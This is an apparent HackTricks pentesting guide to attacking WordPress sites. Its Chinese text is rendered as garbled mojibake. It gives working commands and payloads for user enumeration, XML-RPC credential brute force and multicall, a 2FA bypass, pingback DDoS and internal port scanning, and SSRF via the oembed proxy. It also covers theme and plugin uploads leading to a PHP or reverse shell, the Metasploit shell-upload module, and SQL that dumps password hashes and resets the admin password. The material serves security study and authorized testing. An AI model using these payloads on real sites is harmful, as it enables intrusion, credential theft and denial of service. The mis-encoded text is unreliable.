# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** æ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜çš„æŸäº› php æ¥è·å– RCEï¼Œä½ å¾ˆå¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** å¯ä»¥ **access** **404.php** æ–‡ä»¶ï¼Œè·¯å¾„ä¸º: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­ä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤ç™»å½•è·¯å¾„å¯æ£€æŸ¥ï¼š_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦ WordPress æ–‡ä»¶**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œä¾‹å¦‚å·²å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` åœ¨è®¾ç½®æ–°çš„ WordPress ç«™ç‚¹æ—¶ç”¨äºç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚
- ç™»å½•ç›¸å…³æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè¡¨ç¤º WordPress çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä½¿æ•°æ®å¯ä»¥é€šè¿‡ä»¥ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶ã€ä»¥ XML ä½œä¸ºç¼–ç æœºåˆ¶çš„æ–¹å¼è¿›è¡Œä¼ è¾“ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€å–ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨ plugins å’Œ themes çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å­˜å‚¨ä»»ä½•ä¸Šä¼ åˆ°å¹³å°çš„æ–‡ä»¶çš„ç›®å½•ã€‚
- `wp-includes/` è¿™æ˜¯å­˜æ”¾æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œ widgetsã€‚
- `wp-sitemap.xml` åœ¨ Wordpress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWorpress ä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å¼€å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„ post types åŠ taxonomies çš„ç«™ç‚¹åœ°å›¾ XML æ–‡ä»¶ã€‚

**Post exploitation**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€authentication keys and saltsï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¯¥é…ç½®æ–‡ä»¶è¿˜å¯ç”¨äºæ¿€æ´» DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **Administrator**
- **Editor**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±å’Œä»–äººçš„æ–‡ç« 
- **Author**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« 
- **Contributor**: æ’°å†™å¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« ï¼Œä½†æ— æ³•å‘å¸ƒå®ƒä»¬
- **Subscriber**: æµè§ˆæ–‡ç« å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å– WordPress ç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦èƒ½æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ä¸€èˆ¬æ€§æå–ç‰ˆæœ¬ä¿¡æ¯
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°å…¨éƒ¨ï¼Œä½ éœ€è¦ **ä¸»åŠ¨ Brute Force æ’ä»¶å’Œä¸»é¢˜åˆ—è¡¨**ï¼ˆå¹¸è¿çš„æ˜¯é€šå¸¸æœ‰åŒ…å«è¿™äº›åˆ—è¡¨çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** é€šè¿‡å¯¹ç”¨æˆ· ID è¿›è¡Œ Brute Forcingï¼Œä½ å¯ä»¥ä» WordPress ç«™ç‚¹è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œåˆ™è¡¨ç¤ºè¯¥ id ä¸º **æœ‰æ•ˆ**ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™è¡¨ç¤ºè¯¥ id ä¸º **æ— æ•ˆ**ã€‚

- **wp-json:** ä½ ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯ä»¥æ­ç¤ºä¸€äº›æœ‰å…³ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
æ³¨æ„æ­¤ç«¯ç‚¹ä»…ä¼šæš´éœ²å‘å¸ƒè¿‡æ–‡ç« çš„ç”¨æˆ·ã€‚**ä»…ä¼šæä¾›å¯ç”¨äº†æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

å¦è¯·æ³¨æ„ **/wp-json/wp/v2/pages** å¯èƒ½ä¼šæ³„éœ² IP åœ°å€ã€‚

- **ç™»å½•ç”¨æˆ·åæšä¸¾**ï¼šå½“é€šè¿‡ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æç¤ºä¿¡æ¯**ä¼š**ä¸åŒ**ï¼Œä»¥æŒ‡ç¤ºè¯¥**ç”¨æˆ·åæ˜¯å¦å­˜åœ¨**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¯ç”¨ï¼Œä½ å¯ä»¥æ‰§è¡Œ credentials brute-force æˆ–ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ï¼ˆä¾‹å¦‚ï¼Œä½ å¯ä»¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹[ using this](https://github.com/relarizky/wpxploit)ï¼‰ã€‚

è¦æŸ¥çœ‹å®ƒæ˜¯å¦å¯ç”¨ï¼Œå°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€æ­¤è¯·æ±‚ï¼š

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** æ˜¯å¯ä»¥ç”¨æ¥ brute-force credentials çš„ä¸€äº›æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»æ„ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€åƒè¿™æ ·çš„å†…å®¹ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å½“å‡­è¯æ— æ•ˆæ—¶ï¼ŒHTTP 200 å“åº”ä¸­åº”å‡ºç°æ¶ˆæ¯ _"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­è¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ä¼šæ˜¾ç¤ºè·¯å¾„ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
æ­¤å¤–è¿˜æœ‰ä¸€ç§**æ›´å¿«çš„æ–¹æ³•**æ¥å¯¹å‡­è¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œä½¿ç”¨ **`system.multicall`** å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­è¯ï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

æ­¤æ–¹æ³•é¢å‘ç¨‹åºè€Œéäººå·¥ï¼Œä¸”è¾ƒä¸ºé™ˆæ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„ creds ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº› creds ç™»å½•ä»¥ç»•è¿‡ 2FA**ã€‚è¯·æ³¨æ„ï¼Œä½ æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥åšçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­æ‰€è§£é‡Šçš„ï¼Œä½ ä»ç„¶å¯èƒ½è·å¾— RCEã€‚

**DDoS æˆ–ç«¯å£æ‰«æ**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å°±å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£ å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ç”¨äºè®© **æˆåƒä¸Šä¸‡** çš„ Wordpress **ç«™ç‚¹** å» **è®¿é—®** åŒä¸€ä¸ª **ç›®æ ‡**ï¼ˆä»è€Œåœ¨è¯¥å¤„é€ æˆ **DDoS**ï¼‰ï¼Œæˆ–è€…ä½ ä¹Ÿå¯ä»¥ç”¨å®ƒè®© **Wordpress** å» **æ‰«æ** æŸäº›å†…éƒ¨ **ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** çš„å€¼ **å¤§äº** **0** (17)ï¼Œé‚£å°±æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨æ­¤æ–¹æ³•æ¥å¼•å‘ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

è¯¥æ–‡ä»¶é€šå¸¸ä½äº Wordpress ç«™ç‚¹æ ¹ç›®å½•ï¼š**`/wp-cron.php`**\
å½“è®¿é—®è¯¥æ–‡ä»¶æ—¶ä¼šæ‰§è¡Œä¸€ä¸ªâ€œè€—è´¹èµ„æºâ€çš„ MySQL æŸ¥è¯¢ï¼Œå› æ­¤å¯è¢«æ”»å‡»è€…åˆ©ç”¨å¯¼è‡´ DoSã€‚\
å¦å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• Wordpress é¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹å¯èƒ½å¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨ Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºä¸Šåˆ›å»ºçœŸå®çš„ cronjob å®šæœŸæ‰§è¡Œæ‰€éœ€ä»»åŠ¡ï¼ˆä»¥é¿å…é—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordpress ç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·æ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** å’Œ è·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨åˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†ç›–ä¸€ä¸ª bit è·å¾—è®¿é—®æƒé™

ä¸å…¶è¯´æ˜¯ä¸€æ¬¡çœŸæ­£çš„æ”»å‡»ï¼Œä¸å¦‚è¯´æ˜¯ä¸ªå¥½å¥‡çš„å®éªŒã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶çš„ 1 ä¸ª bitã€‚å› æ­¤ä½ å¯ä»¥ç¿»è½¬æ–‡ä»¶ `/var/www/html/wp-includes/user.php` çš„åç§» `5389` å¤„çš„ä½ï¼ŒæŠŠ NOT (`!`) æ“ä½œå˜æˆ NOPã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ admin credentialsï¼‰**

Appearance â†’ Theme Editor â†’ 404 Templateï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°çš„é¡µé¢ã€‚æœ¬ä¾‹ä¸­ä½ éœ€è¦è®¿é—®ï¼š [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ä»¥è·å–ä¼šè¯ã€‚

## Plugin RCE

### PHP plugin

å¯èƒ½å¯ä»¥ä¸Šä¼  .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ã€‚\
ä½¿ç”¨ä¾‹å¦‚ä¸‹é¢çš„æ–¹æ³•åˆ›å»ºä½ çš„ php backdoorï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°çš„æ’ä»¶ï¼š

![](<../../images/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶æŒ‰ Install Nowï¼š

![](<../../images/image (249).png>)

ç‚¹å‡» Proccedï¼š

![](<../../images/image (70).png>)

è¡¨é¢ä¸Šå¯èƒ½çœ‹èµ·æ¥æ²¡æœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœä½ è¿›å…¥ Mediaï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ ä¼šçœ‹åˆ°ç”¨äºæ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„æ’ä»¶å¹¶åˆ©ç”¨å®ƒæ¥è·å– web shellã€‚è¯¥è¿‡ç¨‹é€šè¿‡ WordPress dashboard æŒ‰å¦‚ä¸‹æ–¹å¼è¿›è¡Œï¼š

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- åœ¨ WordPress dashboard ä¸­ï¼Œè½¬åˆ° `Dashboard > Plugins > Upload Plugin`ã€‚
- ä¸Šä¼ å·²ä¸‹è½½æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **Plugin Activation**: æ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡ dashboard è¿›è¡Œæ¿€æ´»ã€‚
4. **Exploitation**:
- å½“å®‰è£…å¹¶æ¿€æ´»äº†æ’ä»¶ "reflex-gallery" åï¼Œå¯ä»¥åˆ©ç”¨è¯¥å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ’ä»¶è¿›è¡Œæ”»å‡»ã€‚
- Metasploit framework æä¾›äº†é’ˆå¯¹è¯¥æ¼æ´çš„ exploitã€‚é€šè¿‡åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ª meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªæˆæƒè®¿é—®ã€‚
- éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…å«æç»˜åœ¨ WordPress dashboard ä¸­å®‰è£…å’Œæ¿€æ´»æ’ä»¶æ­¥éª¤çš„å¯è§†åŒ–è¾…åŠ©å›¾åƒã€‚ä½†é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹ä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œå¹¶ä»…åœ¨åˆæ³•æƒ…å¢ƒä¸­ï¼Œä¾‹å¦‚è·å¾—æ˜ç¡®è®¸å¯çš„ penetration testing æ—¶ä½¿ç”¨ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ– WordPress ä¸­å…¶ä»–ä¸¥é‡æ¼æ´çš„è„šæœ¬ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒæä¾›å¯¹ Wordpress Versions 6.X.X, 5.X.X å’Œ 4.X.X çš„æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**Privilege Escalation:**_ åœ¨ WordPress ä¸­åˆ›å»ºç”¨æˆ·ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ å°†ä½ çš„è‡ªå®šä¹‰æ’ä»¶ï¼ˆbackdoorï¼‰ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) Built-In Plugin Edit:**_ ç¼–è¾‘ WordPress å†…ç½®æ’ä»¶ã€‚
- _**(RCE) Built-In Theme Edit:**_ ç¼–è¾‘ WordPress å†…ç½®ä¸»é¢˜ã€‚
- _**(Custom) Custom Exploits:**_ ä¸ºç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜æä¾›è‡ªå®šä¹‰ exploitã€‚

## Post Exploitation

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin å¯†ç :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶ Pentest

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½å¯¹äºå‘ç°å…¶åŠŸèƒ½ä¸­çš„æ¼æ´è‡³å…³é‡è¦ã€‚ä½ å¯ä»¥åœ¨ä¸‹é¢çš„è¦ç‚¹ä¸­çœ‹åˆ°æ’ä»¶å¯èƒ½å¦‚ä½•æš´éœ²åŠŸèƒ½ï¼Œä»¥åŠåœ¨ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ä¸­ä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶çš„ç¤ºä¾‹ã€‚

- **`wp_ajax`**

æ’ä»¶å°†åŠŸèƒ½æš´éœ²ç»™ç”¨æˆ·çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX handlersã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘é”™è¯¯ã€authorization æˆ– authentication æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™äº›å‡½æ•°å¾ˆå¸¸è§åœ°ä¼šåŸºäº wordpress nonce çš„å­˜åœ¨æ¥åŒæ—¶åˆ¤æ–­ authentication å’Œ authorizationï¼Œè€Œè¯¥ nonce **any user authenticated in the Wordpress instance might have**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

è¿™äº›æ˜¯å¯ä»¥ç”¨æ¥åœ¨æ’ä»¶ä¸­æš´éœ²å‡½æ•°çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ endpoint å¯¹ä»»ä½•ç”¨æˆ·å¯è®¿é—®ï¼ˆç”šè‡³æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯ä½¿ç”¨ `wp_verify_nonce` æ¥æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œ`wp_verify_nonce` é€šå¸¸åªæ˜¯æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œå¹¶ä¸ä¼šæ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ï¼Œä½æƒé™ç”¨æˆ·å¯èƒ½èƒ½å¤Ÿè®¿é—®é«˜æƒé™æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ wordpress ä¸­ä½¿ç”¨ `register_rest_route` å‡½æ•°æ³¨å†Œ REST API è·¯ç”±æ¥æš´éœ²å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦è¢«æˆæƒè°ƒç”¨è¯¥ API æ–¹æ³•ã€‚

**å¦‚æœä½¿ç”¨å†…ç½®çš„ `__return_true` å‡½æ•°ï¼Œå®ƒä¼šç›´æ¥è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶å†…çš„æ–‡ä»¶å¯ä»¥ç›´æ¥é€šè¿‡ Web è®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†åªéœ€è®¿é—®æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å°†è¢«ä»»ä½•ç”¨æˆ·åˆ©ç”¨ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ– reverse proxies å®ç°äº†â€œtrusted headerâ€å¿«æ·æ–¹å¼ï¼Œå¹¶ä½¿ç”¨è¯¥ header ä¸º REST è¯·æ±‚è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æ²¡æœ‰è¢«ä¸Šæ¸¸ç»„ä»¶ä»¥åŠ å¯†æ–¹å¼ç»‘å®šåˆ°è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ å®ƒï¼Œä»è€Œä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®æœ‰ç‰¹æƒçš„ REST è·¯ç”±ã€‚

